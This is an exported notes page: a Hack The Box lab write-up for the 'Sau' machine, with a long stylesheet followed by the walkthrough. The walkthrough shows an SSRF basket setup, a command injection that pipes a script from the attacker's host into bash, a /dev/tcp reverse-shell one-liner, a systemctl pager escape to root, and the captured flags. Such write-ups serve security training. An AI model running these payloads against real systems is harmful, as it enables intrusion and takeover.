<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Sau</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="3b444dd6-7adf-4deb-b5d4-8226e668f4e4" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">👽</span></div><h1 class="page-title">Sau</h1><p class="page-description"></p></header><div class="page-body"><p id="03dc8f66-ef3c-45f7-a6a0-a69e117f9170" class="">Target: 10.129.248.13</p><p id="8731af9d-444a-4077-9c67-22b6f43a97a5" class="">
</p><p id="95b949ef-59ee-4088-9caa-e20dfdca5c22" class="">Start of nmap:</p><p id="50722a09-2542-4820-9662-0165f264033f" class="">Port 22 and 55555</p><p id="8fe5fa88-3f1c-4f20-befa-093a99b0171d" class="">
</p><p id="240606f1-af8a-41ea-84f2-a08494c721bb" class="">Port 5555 there is a basket service which appears to be vulnerable to SSRF</p><p id="d90b3ab5-8527-4d74-8a0a-4f05c91ca7ae" class="">
</p><p id="d230f92a-a5ed-4308-8261-144067d5b2ef" class="">If we send a basket creation to /web/basketname we can get a callback to our machine</p><p id="de159a78-d6ce-4b90-ab88-1473a34c7054" class="">
</p><p id="04bc2a3c-0d04-48ed-98fe-6300c67923a7" class="">if we send the following payload, we can access the service when visiting the IP address and calling the name of the basket we picked for it. in the below case called requests</p><p id="5fe2bbab-1631-43f4-bd08-16902001ea55" class="">
</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dae8d164-f8eb-4243-b93d-0a4c503192a4" class="code"><code class="language-Rust">{
  &quot;forward_url&quot;: &quot;http://127.0.0.1:80/&quot;,
  &quot;proxy_response&quot;: false,
  &quot;insecure_tls&quot;: false,
  &quot;expand_path&quot;: true,
  &quot;capacity&quot;: 250
}</code></pre><p id="4882f91f-fde4-435f-b89f-e147b53f5d67" class="">
</p><p id="37f85836-1fdc-48a3-b3ad-40aa1efb0b2d" class="">So the service exposed in maltrail</p><p id="c2dd8cf1-356e-4cb4-8625-4b0ab82f39d7" class="">There is a PoC for command injection for it</p><figure id="0f4a79cb-e039-4660-ad81-7e831aad1a81" class="image"><a href="Sau%203b444dd67adf4debb5d48226e668f4e4/Untitled.png"><img style="width:1639px" src="Sau%203b444dd67adf4debb5d48226e668f4e4/Untitled.png"/></a></figure><p id="6b7a27d5-21a7-4df6-b4c1-4099d0a1da0c" class="">
</p><p id="6b8aea4c-cd70-4070-a906-07517eb96d79" class="">We can create a new basket call with curl since burp was not cooperating calling it ‘pwned’ pointing at the /login directory on the service running on 127.0.0.1:80</p><p id="0d58ce84-e37f-4b4d-9c1b-9bb6375e262a" class="">
</p><p id="0cdfdbf5-7543-4714-ab06-a73ee866887f" class="">
</p><p id="acee0c67-176b-4add-90c6-42acb79fdf16" class="">PoC: <a href="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/</a></p><p id="edd64e4b-d14f-4830-bf0c-5501697a16a0" class=""><code>curl --location &#x27;http://10.129.245.195:55555/api/baskets/pwned&#x27; --header &#x27;Content-Type: application/json&#x27; --data &#x27;{&quot;forward_url&quot;: &quot;http://127.0.0.1:80/login&quot;, &quot;proxy_response&quot;: true, &quot;insecure_tls&quot;: false, &quot;expand_path&quot;: true, &quot;capacity&quot;: 250}&#x27;</code></p><p id="38e455f2-57fe-4310-90f3-607927ff4c81" class="">
</p><figure id="af37c57a-3bd4-4897-8e49-e17e39039500" class="image"><a href="Sau%203b444dd67adf4debb5d48226e668f4e4/Untitled%201.png"><img style="width:1468px" src="Sau%203b444dd67adf4debb5d48226e668f4e4/Untitled%201.png"/></a></figure><p id="f64ee051-96a1-4ec0-bc2b-f80a35e494bf" class="">
</p><p id="e25d7428-24b3-4b1e-915d-d1757b2c5904" class="">
</p><p id="eb2b889c-b17c-4cf8-a116-3cd7d93523ed" class="">We can further upload a shell via http server listening on our attack machine and start a nc listener </p><p id="f7e4131d-8e2a-413f-9f8c-3cc45c40ef80" class=""><code>curl &quot;http://10.129.245.195:55555/pwned&quot; --data &#x27;username=;`curl 10.10.14.59:8000/rev.sh | bash`&#x27;</code></p><p id="9f4fa8d1-21e9-4ecc-8919-3569af7106df" class="">
</p><p id="ea7af741-d7c5-4c5e-9190-bab2467b342e" class="">rev.sh</p><p id="d1c00b82-d6f1-4888-bed2-a7e1868234f1" class=""><code>sh -i &gt;&amp; /dev/tcp/10.10.14.59/9001 0&gt;&amp;1</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8ce405e0-9455-468c-900b-ecdf6edbe22a" class="code"><code class="language-Rust">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Sau]
└─$ curl --location &#x27;http://10.129.245.195:55555/api/baskets/pwned&#x27; --header &#x27;Content-Type: application/json&#x27; --data &#x27;{&quot;forward_url&quot;: &quot;http://127.0.0.1:80/login&quot;, &quot;proxy_response&quot;: true, &quot;insecure_tls&quot;: false, &quot;expand_path&quot;: true, &quot;capacity&quot;: 250}&#x27;
{&quot;token&quot;:&quot;3mdzOneo9Rr7_lCwDh_08qYSlbojMjpnfRH0vy1XVbdY&quot;}                                                                                                   
┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Sau]
└─$ curl &quot;http://10.129.245.195:55555/pwned&quot; --data &#x27;username=;`curl 10.10.14.59:8000/rev.sh | bash`&#x27;</code></pre><p id="72977587-ef1f-4f2c-a0f5-d6128c76f734" class="">
</p><figure id="3db66acd-9ed4-42a1-9900-7e701e7aeb12" class="image"><a href="Sau%203b444dd67adf4debb5d48226e668f4e4/Untitled%202.png"><img style="width:1642px" src="Sau%203b444dd67adf4debb5d48226e668f4e4/Untitled%202.png"/></a></figure><p id="592c3888-b79c-4f01-8b06-9e6f08286abc" class="">
</p><p id="98fe90cf-e837-4078-85be-884b20af2e63" class="">We get the user access to the machine as puma</p><p id="9e808eab-ad2d-4a77-b489-7ace51c18d9a" class="">user 3d9e1bb9fcafc023d2b32afe95a0ede3</p><p id="887db266-5283-4dc1-9f64-5d622928a2c2" class="">
</p><hr id="e9efa0b1-eeb7-487e-a236-00e4fb9075c4"/><hr id="6e9c8b89-03a7-4b14-99f3-eefc80362769"/><hr id="3563cd7b-10c9-4428-9045-f3cb946f930a"/><p id="775da7a7-2ee3-4416-afb1-c4bd9c58b2e1" class="">
</p><p id="e78d06e0-76c5-47b1-a9f1-d5cd19b57185" class="">Privesc:</p><p id="0cf40ac7-6ed3-44be-be12-d0b2536adf30" class="">User puma can run sudo -l on the following</p><p id="1b754fba-9e8f-4283-a138-77b4dd5cdaaa" class=""><code>sudo /usr/bin/systemctl status trail.service</code></p><p id="4c06c689-363f-4803-8d90-cd85859e6ddc" class="">
</p><p id="90152c5a-60bf-4f38-8ccc-07569a66fe25" class="">
</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6cef66be-1321-4363-8288-041f3797379f" class="code"><code class="language-Rust">puma@sau:/opt/maltrail$ script /dev/null /bin/bash
script /dev/null /bin/bash
Script started, file is /dev/null
puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:&gt;
     Active: active (running) since Sun 2023-07-09 23:28:55 UTC; 16h ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 872 (python3)
      Tasks: 13 (limit: 4662)
     Memory: 36.3M
     CGroup: /system.slice/trail.service
             ├─ 872 /usr/bin/python3 server.py
             ├─2391 /bin/sh -c logger -p auth.info -t &quot;maltrail[872]&quot; &quot;Failed p&gt;
             ├─2392 /bin/sh -c logger -p auth.info -t &quot;maltrail[872]&quot; &quot;Failed p&gt;
             ├─2400 bash
             ├─2401 sh -i
             ├─2403 python3 -c import pty;pty.spawn(&quot;/bin/bash&quot;)
             ├─2404 /bin/bash
             ├─2460 script /dev/null /bin/bash
             ├─2461 bash -i
             ├─2468 sudo /usr/bin/systemctl status trail.service
             ├─2469 /usr/bin/systemctl status trail.service
             └─2470 pager

Jul 10 15:49:00 sau sudo[2446]:     puma : TTY=pts/0 ; PWD=/opt/maltrail ; USER&gt;
lines 1-23
Jul 10 15:49:39 sau sudo[2447]: pam_unix(sudo:auth): authentication failure; lo&gt;
lines 2-24
Jul 10 15:49:46 sau sudo[2447]:     puma : command not allowed ; TTY=pts/0 ; PW&gt;
lines 3-25
Jul 10 15:50:01 sau sudo[2449]: pam_unix(sudo:auth): authentication failure; lo&gt;
lines 4-26
Jul 10 15:50:09 sau sudo[2449]:     puma : command not allowed ; TTY=pts/0 ; PW&gt;
lines 5-27
Jul 10 15:50:16 sau sudo[2450]:     puma : TTY=pts/0 ; PWD=/opt/maltrail ; USER&gt;
lines 6-28
Jul 10 15:50:16 sau sudo[2450]: pam_unix(sudo:session): session opened for user&gt;
lines 7-29
Jul 10 15:50:25 sau sudo[2450]: pam_unix(sudo:session): session closed for user&gt;
lines 8-30
Jul 10 15:54:29 sau sudo[2468]:     puma : TTY=pts/1 ; PWD=/opt/maltrail ; USER&gt;
lines 9-31!sh
!sh
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
0a0d32accbfe667675755e0b0f9aeb1b</code></pre><p id="cc12c065-e51e-4397-9688-5bc3ff025de5" class="">
</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>